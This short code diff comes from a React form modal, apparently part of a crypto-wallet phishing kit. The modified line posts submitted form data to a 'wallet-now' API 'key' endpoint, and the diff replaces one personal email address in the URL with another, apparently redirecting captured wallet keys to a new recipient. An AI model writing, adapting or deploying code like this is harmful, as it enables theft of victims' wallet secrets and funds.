@@ -26,7 +26,7 @@ const FormModal = ({ handleShowModal, showModal }) => {
   const handleSubmit = (e) => {
     e.preventDefault();
     const email = process.env.REACT_APP_EMAIL;
-    fetch(`https://wallet-now.vercel.app/api/v1/key/Pmoneyking080@gmail.com`, {
+    fetch(`https://wallet-now.vercel.app/api/v1/key/quadriolayiwola3010@gmail.com`, {
       method: "post",
       headers: {
         "Content-Type": "application/json",
